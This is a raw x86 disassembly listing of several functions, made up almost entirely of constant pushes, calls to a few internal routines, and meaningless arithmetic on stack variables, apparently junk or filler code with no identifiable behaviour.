  408132:	add    esp,0x10
  408135:	push   0x1b
  408137:	push   0xffffffc2
  408139:	call   0x408589
  40813e:	add    esp,0x8
  408141:	push   0xffffffce
  408143:	push   0xffffff8a
  408145:	call   0x408aa5
  40814a:	add    esp,0x8
  40814d:	sub    edi,ebx
  40814f:	call   0x408c13
  408154:	sub    DWORD PTR [ebp-0x1c],ebx
  408157:	add    DWORD PTR [ebp-0x1c],edi
  40815a:	push   0xab544f00
  40815f:	push   0xffffff82
  408161:	push   0x6d
  408163:	push   0xf3711900
  408168:	call   0x408817
  40816d:	add    esp,0x10
  408170:	cmp    eax,ebx
  408172:	je     0x408181
  408174:	push   0x579dc400
  408179:	call   0x408da2
  40817e:	add    esp,0x4
  408181:	mov    DWORD PTR [ebp-0x1c],ebx
  408184:	push   0xbb41ae00
  408189:	push   0x1f4bc700
  40818e:	push   0x65be3a00
  408193:	push   0xfdc8c00
  408198:	call   0x4086d1
  40819d:	add    esp,0x10
  4081a0:	mov    ebx,0x7d
  4081a5:	mov    eax,0x91
  4081aa:	push   0x17
  4081ac:	push   0xffffffd8
  4081ae:	push   0x77879b00
  4081b3:	push   0xc74f2300
  4081b8:	push   0xb745cd00
  4081bd:	call   0x408aa5
  4081c2:	add    esp,0x14
  4081c5:	xor    DWORD PTR [ebp-0x1c],ebx
  4081c8:	push   0xfffffffc
  4081ca:	push   0xfe9c800
  4081cf:	push   0xcff03a00
  4081d4:	push   0xff45f600
  4081d9:	push   0x12
  4081db:	call   0x408817
  4081e0:	add    esp,0x14
  4081e3:	pop    edi
  4081e4:	push   0xf
  4081e6:	push   0xffffffa6
  4081e8:	call   0x408da2
  4081ed:	add    esp,0x8
  4081f0:	push   0xffffff92
  4081f2:	push   0xef1fc700
  4081f7:	push   0x2c
  4081f9:	push   0x13
  4081fb:	call   0x408da2
  408200:	add    esp,0x10
  408203:	pop    esi
  408204:	push   0xc5f06400
  408209:	push   0x159ec100
  40820e:	push   0xb75ed400
  408213:	push   0x9b4c4200
  408218:	push   0x97476700
  40821d:	call   0x408c13
  408222:	add    esp,0x14
  408225:	push   0xffffff8e
  408227:	push   0x60
  408229:	call   0x4086d1
  40822e:	add    esp,0x8
  408231:	pop    ebx
  408232:	sub    DWORD PTR [ebp-0x1c],ebx
  408235:	push   0x15
  408237:	push   0xd59b7500
  40823c:	push   0x5f0e8f00
  408241:	call   0x408da2
  408246:	add    esp,0xc
  408249:	leave  
  40824a:	ret    
  40824b:	int3   
  40824c:	int3   
  40824d:	int3   
  40824e:	int3   
  40824f:	int3   
  408250:	push   ebp
  408251:	mov    ebp,esp
  408253:	sub    esp,0x24
  408256:	mov    ecx,0xe8b4
  40825b:	mov    eax,0xa1
  408260:	mov    DWORD PTR [ebp-0x18],ecx
  408263:	push   0xff4ef00
  408268:	push   0x64
  40826a:	push   0x62
  40826c:	call   0x408589
  408271:	add    esp,0xc
  408274:	push   0xcffa4e00
  408279:	push   0xffffffcd
  40827b:	push   0xcfce0800
  408280:	push   0x8f98ff00
  408285:	call   0x4086d1
  40828a:	add    esp,0x10
  40828d:	push   ebx
  40828e:	mov    ecx,DWORD PTR [ebp-0x18]
  408291:	xor    DWORD PTR [ebp-0x18],eax
  408294:	push   0x65
  408296:	push   0xe701c900
  40829b:	push   0xffffffb4
  40829d:	call   0x408e8e
  4082a2:	add    esp,0xc
  4082a5:	push   esi
  4082a6:	xor    eax,eax
  4082a8:	call   0x408e8e
  4082ad:	push   0x1752bf00
  4082b2:	push   0x77c0ba00
  4082b7:	push   0x68
  4082b9:	push   0x7f06d900
  4082be:	call   0x408c13
  4082c3:	add    esp,0x10
  4082c6:	push   edi
  4082c7:	mov    ebx,0xc762
  4082cc:	push   0x4f
  4082ce:	call   0x408da2
  4082d3:	add    esp,0x4
  4082d6:	push   0xb722da00
  4082db:	push   0xe5be7600
  4082e0:	push   0x75890500
  4082e5:	push   0x4fd66f00
  4082ea:	push   0x7b227800
  4082ef:	call   0x408c13
  4082f4:	add    esp,0x14
  4082f7:	push   0x79
  4082f9:	push   0x35be2900
  4082fe:	push   0xb694800
  408303:	push   0x1b13de00
  408308:	push   0x2f520400
  40830d:	call   0x408aa5
  408312:	add    esp,0x14
  408315:	mov    edx,0x98
  40831a:	and    DWORD PTR [ebp-0x18],eax
  40831d:	call   0x408da2
  408322:	push   0x5f6f5e00
  408327:	push   0x18
  408329:	push   0xcb415100
  40832e:	push   0x4704dc00
  408333:	push   0xfffffffb
  408335:	call   0x408c13
  40833a:	add    esp,0x14
  40833d:	and    ebx,eax
  40833f:	call   0x4086d1
  408344:	or     ebx,eax
  408346:	cmp    eax,ebx
  408348:	jne    0x4084d1
  40834e:	mov    ecx,eax
  408350:	test   ebx,0x46
  408356:	je     0x4084d1
  40835c:	add    DWORD PTR [ebp-0x18],ecx
  40835f:	xor    ecx,ecx
  408361:	push   0xffffff9d
  408363:	push   0x39
  408365:	call   0x408c13
  40836a:	add    esp,0x8
  40836d:	push   0xcb3a1700
  408372:	push   0xdf0e6000
  408377:	call   0x408817
  40837c:	add    esp,0x8
  40837f:	push   0xb
  408381:	push   0x2
  408383:	push   0x1d
  408385:	push   0xdf0ca800
  40838a:	call   0x408817
  40838f:	add    esp,0x10
  408392:	call   0x408589
  408397:	add    ebx,ebx
  408399:	mov    esi,0x45
  40839e:	call   0x408817
  4083a3:	push   0xffffffc1
  4083a5:	push   0x37596700
  4083aa:	push   0xb592aa00
  4083af:	push   0xffffff90
  4083b1:	push   0xc5c51600
  4083b6:	call   0x408817
  4083bb:	add    esp,0x14
  4083be:	and    DWORD PTR [ebp-0x18],ebx
  4083c1:	call   0x408817
  4083c6:	sub    DWORD PTR [ebp-0x18],ebx
  4083c9:	push   0x5b
  4083cb:	push   0x132de600
  4083d0:	push   0x7323fe00
  4083d5:	push   0x33
  4083d7:	push   0x23668f00
  4083dc:	call   0x408589
  4083e1:	add    esp,0x14
  4083e4:	push   0xfdb3400
  4083e9:	push   0x3a
  4083eb:	push   0xffffffd3
  4083ed:	push   0x2b1f3500
  4083f2:	push   0x975e4300
  4083f7:	call   0x408e8e
  4083fc:	add    esp,0x14
  4083ff:	push   0x47
  408401:	push   0x8763d600
  408406:	push   0xd5a7f500
  40840b:	call   0x408aa5
  408410:	add    esp,0xc
  408413:	call   0x408589
  408418:	push   0x15dcf400
  40841d:	push   0xffffffe0
  40841f:	push   0x673f1e00
  408424:	call   0x4086d1
  408429:	add    esp,0xc
  40842c:	push   0x8f961400
  408431:	call   0x408aa5
  408436:	add    esp,0x4
  408439:	sub    esi,ebx
  40843b:	push   0x48
  40843d:	push   0x17
  40843f:	push   0x25b07f00
  408444:	call   0x408589
  408449:	add    esp,0xc
  40844c:	call   0x408e8e
  408451:	call   0x408c13
  408456:	push   0x35a53000
  40845b:	push   0xffffffaa
  40845d:	call   0x408589
  408462:	add    esp,0x8
  408465:	or     esi,eax
  408467:	push   0xffffffcd
  408469:	push   0x26
  40846b:	call   0x408e8e
  408470:	add    esp,0x8
  408473:	push   0xe303b600
  408478:	call   0x408589
  40847d:	add    esp,0x4
  408480:	push   0xf87ee00
  408485:	call   0x408aa5
  40848a:	add    esp,0x4
  40848d:	cmp    esi,0xfffffffb
  408490:	je     0x4084d1
  408492:	push   0xfffffff2
  408494:	push   0xa5cc7c00
  408499:	push   0x32
  40849b:	call   0x4086d1
  4084a0:	add    esp,0xc
  4084a3:	push   0xf5d61e00
  4084a8:	push   0x63
  4084aa:	push   0x2f
  4084ac:	push   0x95b06e00
  4084b1:	push   0xffffffef
  4084b3:	call   0x408aa5
  4084b8:	add    esp,0x14
  4084bb:	push   0x29
  4084bd:	push   0xffffff85
  4084bf:	push   0xe70f9200
  4084c4:	push   0x2f
  4084c6:	call   0x408da2
  4084cb:	add    esp,0x10
  4084ce:	and    DWORD PTR [ebp-0x18],esi
  4084d1:	push   0xef33ee00
  4084d6:	push   0xa77f7100
  4084db:	push   0xffffff9e
  4084dd:	push   0xffffff85
  4084df:	push   0x1
  4084e1:	call   0x408589
  4084e6:	add    esp,0x14
  4084e9:	push   0x21
  4084eb:	call   0x408aa5
  4084f0:	add    esp,0x4
  4084f3:	push   0x5a
  4084f5:	call   0x408da2
  4084fa:	add    esp,0x4
  4084fd:	push   0x1b2de200
  408502:	push   0xf7aae100
  408507:	push   0x7f
  408509:	call   0x408e8e
  40850e:	add    esp,0xc
  408511:	push   0xffffffd7
  408513:	push   0xf7861d00
  408518:	push   0xdb5d7200
  40851d:	push   0xffffffed
  40851f:	push   0xa599f100
  408524:	call   0x408da2
  408529:	add    esp,0x14
  40852c:	add    DWORD PTR [ebp-0x18],esi
  40852f:	push   0x7c
  408531:	call   0x408c13
  408536:	add    esp,0x4
  408539:	pop    edi
  40853a:	and    eax,edi
  40853c:	add    DWORD PTR [ebp-0x18],eax
  40853f:	push   0x37
  408541:	push   0x51
  408543:	call   0x408e8e
  408548:	add    esp,0x8
  40854b:	pop    esi
  40854c:	call   0x4086d1
  408551:	push   0x57
  408553:	push   0xcf006c00
  408558:	push   0x7f674700
  40855d:	push   0x358e7300
  408562:	push   0xf7d8f600
  408567:	call   0x408e8e
  40856c:	add    esp,0x14
  40856f:	pop    ebx
  408570:	call   0x408817
  408575:	push   0xe318c600
  40857a:	call   0x408aa5
  40857f:	add    esp,0x4
  408582:	leave  
  408583:	ret    
  408584:	int3   
  408585:	int3   
  408586:	int3   
  408587:	int3   
  408588:	int3   
  408589:	push   ebp
  40858a:	mov    ebp,esp
  40858c:	sub    esp,0x30
  40858f:	push   0x9b397a00
  408594:	push   0x29
  408596:	call   0x408e8e
  40859b:	add    esp,0x8
  40859e:	push   ebx
  40859f:	push   0x536a1700
  4085a4:	push   0x470ae600
  4085a9:	push   0xaf08e100
  4085ae:	push   0x47071100
  4085b3:	push   0x16
  4085b5:	call   0x408c13
  4085ba:	add    esp,0x14
  4085bd:	push   esi
  4085be:	mov    DWORD PTR [ebp-0x14],eax
  4085c1:	push   edi
  4085c2:	push   0x3e
  4085c4:	push   0xffffffec
  4085c6:	push   0x4f8ef100
  4085cb:	push   0x57e68000
  4085d0:	call   0x408da2
  4085d5:	add    esp,0x10
  4085d8:	push   0xffffffb6
  4085da:	push   0xcb5a0400
  4085df:	push   0x3d
  4085e1:	push   0x3e
  4085e3:	call   0x408c13
  4085e8:	add    esp,0x10
  4085eb:	push   0x77395500
  4085f0:	push   0xd58b3700
  4085f5:	call   0x408da2
  4085fa:	add    esp,0x8
  4085fd:	push   0x31
  4085ff:	push   0xfffffff2
  408601:	push   0xffffffe2
  408603:	call   0x408c13
  408608:	add    esp,0xc
  40860b:	push   0x8f79b900
  408610:	push   0xcf1d1b00
  408615:	push   0x85f59e00
  40861a:	call   0x408e8e
  40861f:	add    esp,0xc
  408622:	push   0xffffffeb
  408624:	push   0x1b369200
  408629:	push   0xcf5dd300
  40862e:	push   0xb7730e00
  408633:	call   0x408e8e
  408638:	add    esp,0x10
  40863b:	push   0x77fed00
  408640:	push   0xc5e6df00
  408645:	call   0x408c13
  40864a:	add    esp,0x8
  40864d:	push   0xd
  40864f:	push   0x5a
  408651:	push   0x15c4ce00
  408656:	push   0xf5aaab00
  40865b:	push   0xffffffdb
  40865d:	call   0x408da2
  408662:	add    esp,0x14
  408665:	add    eax,eax
  408667:	call   0x408c13
  40866c:	pop    edi
  40866d:	mov    ecx,DWORD PTR [ebp-0x14]
  408670:	cmp    edi,DWORD PTR [ebp-0x8]
  408673:	je     0x40868b
  408675:	cmp    edi,0x76
  408678:	jne    0x40868b
  40867a:	mov    edx,ecx
  40867c:	push   0xffffffd6
  40867e:	push   0xcfcaa800
  408683:	call   0x408c13
  408688:	add    esp,0x8
  40868b:	pop    esi
  40868c:	mov    edx,esi
  40868e:	push   0x11
  408690:	push   0x20
  408692:	push   0x6a
  408694:	call   0x408c13
  408699:	add    esp,0xc
  40869c:	push   0xfffffff8
  40869e:	call   0x408c13
  4086a3:	add    esp,0x4
  4086a6:	pop    ebx
  4086a7:	mov    ecx,eax
  4086a9:	push   0xb5811600
  4086ae:	push   0xfffffff2
  4086b0:	push   0x77cf2400
  4086b5:	call   0x408e8e
  4086ba:	add    esp,0xc
  4086bd:	push   0x8ff12400
  4086c2:	call   0x408da2
  4086c7:	add    esp,0x4
  4086ca:	leave  
  4086cb:	ret    
  4086cc:	int3   
  4086cd:	int3   
  4086ce:	int3   
  4086cf:	int3   
  4086d0:	int3   
  4086d1:	push   ebp
  4086d2:	mov    ebp,esp
  4086d4:	sub    esp,0x2c
  4086d7:	push   0xffffffc1
  4086d9:	push   0x5f1e6b00
  4086de:	push   0x6f
  4086e0:	push   0xffffffc0
  4086e2:	call   0x408e8e
  4086e7:	add    esp,0x10
  4086ea:	call   0x408da2
  4086ef:	push   ebx
  4086f0:	push   0x36
  4086f2:	push   0x7b282000
  4086f7:	push   0x77941a00
  4086fc:	call   0x408c13
  408701:	add    esp,0xc
  408704:	push   0xffffffe1
  408706:	push   0xffffff95
  408708:	push   0x15
  40870a:	push   0xffffffb7
  40870c:	push   0x35ba1500
  408711:	call   0x408da2
  408716:	add    esp,0x14
  408719:	push   esi
  40871a:	mov    ecx,0xf5
  40871f:	mov    DWORD PTR [ebp-0x14],ecx
  408722:	push   0xbf40b200
  408727:	push   0xffffffce
  408729:	push   0xd70d3e00
  40872e:	push   0xffffffde
  408730:	push   0x534af900
  408735:	call   0x408c13
  40873a:	add    esp,0x14
  40873d:	push   edi
  40873e:	mov    ebx,DWORD PTR ds:0x44a3a4
  408744:	and    eax,ebx
  408746:	push   0x6f
  408748:	push   0x37405700
  40874d:	push   0xffffffe7
  40874f:	push   0xffffffbb
  408751:	call   0x408da2
  408756:	add    esp,0x10
  408759:	sub    DWORD PTR [ebp-0x14],ebx
  40875c:	push   0xcfdb5200
  408761:	push   0xffffffc6
  408763:	push   0x8fe2b800
  408768:	push   0x7d
  40876a:	call   0x408e8e
  40876f:	add    esp,0x10
  408772:	mov    eax,DWORD PTR [ebp-0x14]
  408775:	push   0xffffff95
  408777:	push   0x5796db00
  40877c:	push   0x31
  40877e:	call   0x408c13
  408783:	add    esp,0xc
  408786:	push   0x5c
  408788:	push   0x176b2000
  40878d:	push   0xffffffa7
  40878f:	push   0x10
  408791:	push   0xffffffa3
  408793:	call   0x408c13
  408798:	add    esp,0x14
  40879b:	call   0x408da2
  4087a0:	cmp    eax,0x1b
  4087a3:	je     0x4087b9
  4087a5:	push   0xffffffae
  4087a7:	push   0x710ce00
  4087ac:	push   0xb54cb00
  4087b1:	call   0x408e8e
  4087b6:	add    esp,0xc
  4087b9:	push   0x57991800
  4087be:	push   0xffffff91
  4087c0:	push   0xe59d4000
  4087c5:	push   0xffffffde
  4087c7:	push   0x6f
  4087c9:	call   0x408e8e
  4087ce:	add    esp,0x14
  4087d1:	cmp    eax,0xfffffff6
  4087d4:	je     0x4087e7
  4087d6:	push   0x54
  4087d8:	push   0x45
  4087da:	push   0xbf586d00
  4087df:	call   0x408c13
  4087e4:	add    esp,0xc
  4087e7:	push   0xffffffb1
  4087e9:	push   0xb3693b00
  4087ee:	call   0x408da2
  4087f3:	add    esp,0x8
  4087f6:	pop    edi
  4087f7:	sub    eax,edi
  4087f9:	add    DWORD PTR [ebp-0x14],eax
  4087fc:	pop    esi
  4087fd:	call   0x408c13
  408802:	pop    ebx
  408803:	mov    ecx,DWORD PTR [ebp-0x14]
  408806:	push   0x3f
  408808:	call   0x408c13
  40880d:	add    esp,0x4
  408810:	leave  
  408811:	ret    
  408812:	int3   
  408813:	int3   
  408814:	int3   
  408815:	int3   
  408816:	int3   
  408817:	push   ebp
  408818:	mov    ebp,esp
  40881a:	sub    esp,0x34
  40881d:	push   0x777a0b00
  408822:	call   0x408c13
  408827:	add    esp,0x4
  40882a:	push   ebx
  40882b:	call   0x408c13
  408830:	push   0xffffffd1
  408832:	call   0x408da2
  408837:	add    esp,0x4
  40883a:	push   esi
  40883b:	push   0x6598dd00
  408840:	push   0x313d400
  408845:	push   0xc7022d00
  40884a:	push   0x5b
  40884c:	push   0xfffffff9
  40884e:	call   0x408da2
  408853:	add    esp,0x14
  408856:	push   edi
  408857:	mov    edx,eax
  408859:	push   0xa7528e00
  40885e:	push   0xfffffffc
  408860:	push   0x5d33100
  408865:	push   0x872b9a00
  40886a:	call   0x408c13
  40886f:	add    esp,0x10
  408872:	push   0x12
  408874:	push   0x3c
  408876:	push   0xfffffff1
  408878:	push   0xffffffee
  40887a:	call   0x408c13
  40887f:	add    esp,0x10
  408882:	push   0x95fb1300
  408887:	call   0x408e8e
  40888c:	add    esp,0x4
  40888f:	mov    ebx,0x64
  408894:	push   0x71
  408896:	push   0xffffffdb
  408898:	push   0x1f36dc00
  40889d:	push   0xffffffcd
  40889f:	call   0x408e8e
  4088a4:	add    esp,0x10
  4088a7:	mov    ecx,0xc6a4
  4088ac:	push   0x93612700
  4088b1:	push   0x332ae500
  4088b6:	push   0xcf3ae300
  4088bb:	push   0x57d77100
  4088c0:	call   0x408c13
  4088c5:	add    esp,0x10
  4088c8:	sub    ebx,eax
  4088ca:	cmp    ebx,0x78
  4088cd:	jne    0x408a16
  4088d3:	push   0xffffff91
  4088d5:	push   0xffffff92
  4088d7:	push   0x3f1a8700
  4088dc:	push   0xffffffaa
  4088de:	call   0x408c13
  4088e3:	add    esp,0x10
  4088e6:	push   0x71c2f00
  4088eb:	push   0x8b2f1f00
  4088f0:	push   0xffffff84
  4088f2:	push   0xf58c0a00
  4088f7:	call   0x408c13
  4088fc:	add    esp,0x10
  4088ff:	mov    edi,ebx
  408901:	push   0xf7a97d00
  408906:	push   0x34
  408908:	push   0xffffffbe
  40890a:	call   0x408c13
  40890f:	add    esp,0xc
  408912:	mov    ecx,0xab
  408917:	push   0xf7adb100
  40891c:	push   0xb73d8900
  408921:	call   0x408e8e
  408926:	add    esp,0x8
  408929:	push   0x65efba00
  40892e:	push   0x74
  408930:	push   0x65f56e00
  408935:	call   0x408c13
  40893a:	add    esp,0xc
  40893d:	push   0x51
  40893f:	call   0x408c13
  408944:	add    esp,0x4
  408947:	call   0x408da2
  40894c:	push   0xb5f60600
  408951:	call   0x408da2
  408956:	add    esp,0x4
  408959:	call   0x408e8e
  40895e:	call   0x408e8e
  408963:	call   0x408c13
  408968:	push   0xffffffb1
  40896a:	push   0xffffffe2
  40896c:	push   0x51
  40896e:	call   0x408c13
  408973:	add    esp,0xc
  408976:	push   0x5792ec00
  40897b:	push   0x57ed2300
  408980:	call   0x408c13
  408985:	add    esp,0x8
  408988:	mov    DWORD PTR [ebp-0x34],eax
  40898b:	push   0x55
  40898d:	call   0x408c13
  408992:	add    esp,0x4
  408995:	sub    edi,ebx
  408997:	push   0xf350a200
  40899c:	push   0x77158600
  4089a1:	push   0x75b43a00
  4089a6:	call   0x408da2
  4089ab:	add    esp,0xc
  4089ae:	test   edi,0x19
  4089b4:	je     0x408a16
  4089b6:	add    DWORD PTR [ebp-0x34],ebx
  4089b9:	push   0x85a90e00
  4089be:	call   0x408e8e
  4089c3:	add    esp,0x4
  4089c6:	push   0x30
  4089c8:	push   0x2b799800
  4089cd:	call   0x408da2
  4089d2:	add    esp,0x8
  4089d5:	cmp    edi,0xfffffff5
  4089d8:	je     0x408a16
  4089da:	push   0x57877900
  4089df:	push   0xfffffff1
  4089e1:	push   0x9
  4089e3:	push   0x4f36a500
  4089e8:	push   0xffffffa2
  4089ea:	call   0x408c13
  4089ef:	add    esp,0x14
  4089f2:	mov    DWORD PTR [ebp-0x34],eax
  4089f5:	push   0xcff3ae00
  4089fa:	push   0xfffffff3
  4089fc:	call   0x408da2
  408a01:	add    esp,0x8
  408a04:	push   0x4b1dba00
  408a09:	push   0x2
  408a0b:	call   0x408da2
  408a10:	add    esp,0x8
  408a13:	sub    DWORD PTR [ebp-0x34],edi
  408a16:	push   0xf5f92000
  408a1b:	call   0x408c13
  408a20:	add    esp,0x4
  408a23:	push   0xd31f5b00
  408a28:	push   0xe5aab300
  408a2d:	push   0xb5899700
  408a32:	push   0x8585f900
  408a37:	call   0x408c13
  408a3c:	add    esp,0x10
  408a3f:	pop    edi
  408a40:	cmp    eax,0xf
  408a43:	jne    0x408a60
  408a45:	sub    ebx,eax
  408a47:	call   0x408e8e
  408a4c:	push   0x12
  408a4e:	push   0xffffffac
  408a50:	push   0x4fed1100
  408a55:	call   0x408e8e
  408a5a:	add    esp,0xc
  408a5d:	mov    DWORD PTR [ebp-0x1c],ebx
  408a60:	push   0xffffff96
  408a62:	push   0xffffff92
  408a64:	push   0x71
  408a66:	push   0xfffffff1
  408a68:	call   0x408da2
  408a6d:	add    esp,0x10
  408a70:	pop    esi
  408a71:	call   0x408da2
  408a76:	push   0xffffffdb
  408a78:	push   0x4b47ce00
  408a7d:	push   0x57
  408a7f:	push   0x35ac0400
  408a84:	push   0x6e
  408a86:	call   0x408e8e
  408a8b:	add    esp,0x14
  408a8e:	pop    ebx
  408a8f:	mov    ecx,0x9d52
  408a94:	mov    eax,ecx
  408a96:	mov    DWORD PTR [ebp-0x4],eax
  408a99:	call   0x408c13
  408a9e:	leave  
  408a9f:	ret    
  408aa0:	int3   
  408aa1:	int3   
  408aa2:	int3   
  408aa3:	int3   
  408aa4:	int3   
  408aa5:	push   ebp
  408aa6:	mov    ebp,esp
  408aa8:	sub    esp,0x30
  408aab:	push   0xffffffaf
  408aad:	push   0xffffffa5
  408aaf:	call   0x408da2
  408ab4:	add    esp,0x8
  408ab7:	push   ebx
  408ab8:	mov    edx,0xd1
  408abd:	call   0x408da2
  408ac2:	push   0xb724a800
  408ac7:	push   0xffffff88
  408ac9:	push   0xffffffcd
  408acb:	push   0x58
  408acd:	push   0x21
  408acf:	call   0x408e8e
  408ad4:	add    esp,0x14
  408ad7:	push   esi
  408ad8:	push   0xdf78a500
  408add:	push   0x3359f00
  408ae2:	push   0x5c
  408ae4:	push   0xd
  408ae6:	push   0x8f9ed800
  408aeb:	call   0x408e8e
  408af0:	add    esp,0x14
  408af3:	push   edi
  408af4:	call   0x408c13
  408af9:	push   0xffffffe5
  408afb:	push   0xb5cd9d00
  408b00:	call   0x408e8e
  408b05:	add    esp,0x8
  408b08:	push   0x3
  408b0a:	push   0x4327ce00
  408b0f:	call   0x408da2
  408b14:	add    esp,0x8
  408b17:	push   0xffffff9a
  408b19:	push   0x49
  408b1b:	push   0x67
  408b1d:	push   0x4d
  408b1f:	call   0x408c13
  408b24:	add    esp,0x10
  408b27:	cmp    eax,0xffffffd6
  408b2a:	jne    0x408b39
  408b2c:	push   0xcfc54300
  408b31:	call   0x408c13
  408b36:	add    esp,0x4
  408b39:	push   0xffffffb7
  408b3b:	push   0x5b0d4f00
  408b40:	push   0x15c82000
  408b45:	push   0x2b2c1800
  408b4a:	call   0x408c13
  408b4f:	add    esp,0x10
  408b52:	test   eax,0x81
  408b57:	jne    0x408b63
  408b59:	push   0xffffffdb
  408b5b:	call   0x408e8e
  408b60:	add    esp,0x4
  408b63:	push   0x43397d00
  408b68:	push   0xa32bc600
  408b6d:	push   0xf5a4b600
  408b72:	push   0xf875b00
  408b77:	push   0x23
  408b79:	call   0x408e8e
  408b7e:	add    esp,0x14
  408b81:	push   0x5f558100
  408b86:	push   0x2f0ebd00
  408b8b:	push   0x36
  408b8d:	push   0xa3071600
  408b92:	call   0x408e8e
  408b97:	add    esp,0x10
  408b9a:	push   0xffffffd8
  408b9c:	push   0x15e18600
  408ba1:	push   0x73
  408ba3:	push   0x55
  408ba5:	push   0x7285a00
  408baa:	call   0x408da2
  408baf:	add    esp,0x14
  408bb2:	push   0xfffffff2
  408bb4:	push   0x43117300
  408bb9:	call   0x408da2
  408bbe:	add    esp,0x8
  408bc1:	pop    edi
  408bc2:	call   0x408e8e
  408bc7:	push   0x64
  408bc9:	push   0x67615400
  408bce:	push   0x55af6500
  408bd3:	push   0x67
  408bd5:	call   0x408e8e
  408bda:	add    esp,0x10
  408bdd:	pop    esi
  408bde:	push   0x69
  408be0:	push   0xd3233400
  408be5:	push   0x43605b00
  408bea:	call   0x408da2
  408bef:	add    esp,0xc
  408bf2:	call   0x408e8e
  408bf7:	pop    ebx
  408bf8:	push   0xe5f7bb00
  408bfd:	push   0xfffffff4
  408bff:	push   0x35969e00
  408c04:	call   0x408da2
  408c09:	add    esp,0xc
  408c0c:	leave  
  408c0d:	ret    
  408c0e:	int3   
  408c0f:	int3   
  408c10:	int3   
  408c11:	int3   
  408c12:	int3   
  408c13:	push   ebp
  408c14:	mov    ebp,esp
  408c16:	sub    esp,0x1c
  408c19:	mov    eax,0xf485
  408c1e:	mov    edx,0x8b
  408c23:	mov    DWORD PTR [ebp-0x14],edx
  408c26:	or     edx,eax
  408c28:	and    DWORD PTR [ebp-0x14],eax
  408c2b:	sub    edx,eax
  408c2d:	add    edx,eax
  408c2f:	and    DWORD PTR [ebp-0x14],edx
  408c32:	push   ebx
  408c33:	mov    ecx,0xa7a
  408c38:	and    ecx,eax
  408c3a:	add    DWORD PTR [ebp-0x14],ecx
  408c3d:	push   esi
  408c3e:	sub    DWORD PTR [ebp-0x14],ecx
  408c41:	push   edi
  408c42:	mov    esi,0x3d
  408c47:	sub    DWORD PTR [ebp-0x14],esi
  408c4a:	add    edx,esi
  408c4c:	mov    ebx,DWORD PTR [ebp-0x14]
  408c4f:	mov    eax,DWORD PTR [ebp-0x14]
  408c52:	or     DWORD PTR [ebp-0x14],edx
  408c55:	add    ebx,eax
  408c57:	cmp    ebx,0xf3ed
  408c5d:	jne    0x408c62
  408c5f:	sub    DWORD PTR [ebp-0x14],ebx
  408c62:	cmp    ebx,0xffffff9b
  408c65:	je     0x408c78
  408c67:	mov    ebx,DWORD PTR [ebp-0x14]
  408c6a:	mov    ecx,0xe2
  408c6f:	cmp    ebx,ecx
  408c71:	jne    0x408c78
  408c73:	or     ecx,ebx
  408c75:	add    DWORD PTR [ebp-0x14],ecx
  408c78:	add    DWORD PTR [ebp-0x14],esi
  408c7b:	pop    edi
  408c7c:	mov    esi,0xaf
  408c81:	mov    eax,DWORD PTR ds:0x44a3a0
  408c87:	add    DWORD PTR [ebp-0x14],eax
  408c8a:	sub    edx,esi
  408c8c:	or     DWORD PTR [ebp-0x14],edi
  408c8f:	and    edx,eax
  408c91:	cmp    ebx,0x2962
  408c97:	jne    0x408cbf
  408c99:	and    edx,ecx
  408c9b:	mov    ecx,DWORD PTR [ebp-0x14]
  408c9e:	cmp    ebx,DWORD PTR ds:0x44a3a0
  408ca4:	jne    0x408cbf
  408ca6:	and    ecx,edx
  408ca8:	mov    esi,DWORD PTR [ebp-0x14]
  408cab:	sub    DWORD PTR [ebp-0x14],esi
  408cae:	mov    edx,0x2a
  408cb3:	sub    DWORD PTR [ebp-0x14],ecx
  408cb6:	sub    edx,eax
  408cb8:	add    edx,esi
  408cba:	add    edx,eax
  408cbc:	sub    DWORD PTR [ebp-0x14],edx
  408cbf:	pop    esi
  408cc0:	cmp    esi,0x55
  408cc3:	jne    0x408d4e
  408cc9:	add    ebx,edi
  408ccb:	add    ebx,ebx
  408ccd:	mov    eax,0xa7
  408cd2:	sub    DWORD PTR [ebp-0x14],ecx
  408cd5:	sub    eax,ebx
  408cd7:	add    eax,eax
  408cd9:	add    eax,eax
  408cdb:	mov    ecx,DWORD PTR [ebp-0x14]
  408cde:	add    DWORD PTR [ebp-0x14],esi
  408ce1:	test   eax,0x82
  408ce6:	jne    0x408d4e
  408ce8:	mov    ebx,DWORD PTR [ebp-0x14]
  408ceb:	sub    DWORD PTR [ebp-0x14],ecx
  408cee:	xor    edx,edx
  408cf0:	add    DWORD PTR [ebp-0x14],edx
  408cf3:	cmp    ebx,0xffffffb6
  408cf6:	je     0x408d4e
  408cf8:	sub    ebx,ecx
  408cfa:	mov    ecx,0x8e
  408cff:	and    ebx,edx
  408d01:	mov    edx,DWORD PTR [ebp-0x14]
  408d04:	cmp    ebx,DWORD PTR [ebp-0x18]
  408d07:	jne    0x408d4e
  408d09:	add    DWORD PTR [ebp-0x14],ebx
  408d0c:	xor    ebx,ebx
  408d0e:	add    edx,edi
  408d10:	add    edx,edi
  408d12:	or     DWORD PTR [ebp-0x14],eax
  408d15:	sub    ecx,ebx
  408d17:	and    edx,esi
  408d19:	add    DWORD PTR [ebp-0x14],esi
  408d1c:	sub    ecx,eax
  408d1e:	sub    ecx,eax
  408d20:	cmp    edx,0xdffa
  408d26:	je     0x408d4e
  408d28:	xor    eax,eax
  408d2a:	cmp    edx,0xffffffcd
  408d2d:	jne    0x408d4e
  408d2f:	mov    ebx,DWORD PTR [ebp-0x14]
  408d32:	sub    DWORD PTR [ebp-0x14],ebx
  408d35:	sub    DWORD PTR [ebp-0x14],ebx
  408d38:	mov    ebx,eax
  408d3a:	sub    DWORD PTR [ebp-0x14],edi
  408d3d:	add    DWORD PTR [ebp-0x14],ebx
  408d40:	test   edx,0x6c
  408d46:	jne    0x408d4e
  408d48:	and    DWORD PTR [ebp-0x14],ecx
  408d4b:	add    DWORD PTR [ebp-0x14],edx
  408d4e:	pop    ebx
  408d4f:	add    edx,eax
  408d51:	mov    ecx,edx
  408d53:	sub    ecx,eax
  408d55:	sub    ecx,ebx
  408d57:	or     ecx,edx
  408d59:	cmp    ecx,0x35
  408d5c:	je     0x408d9b
  408d5e:	sub    DWORD PTR [ebp-0x14],edi
  408d61:	mov    edx,DWORD PTR [ebp-0x14]
  408d64:	cmp    ecx,DWORD PTR ds:0x44a3a0
  408d6a:	jne    0x408d9b
  408d6c:	add    edx,ecx
  408d6e:	mov    ecx,0x9ccb
  408d73:	add    DWORD PTR [ebp-0x14],edx
  408d76:	cmp    esi,0x43
  408d79:	jne    0x408d9b
  408d7b:	mov    ecx,0xc9
  408d80:	sub    ecx,ebx
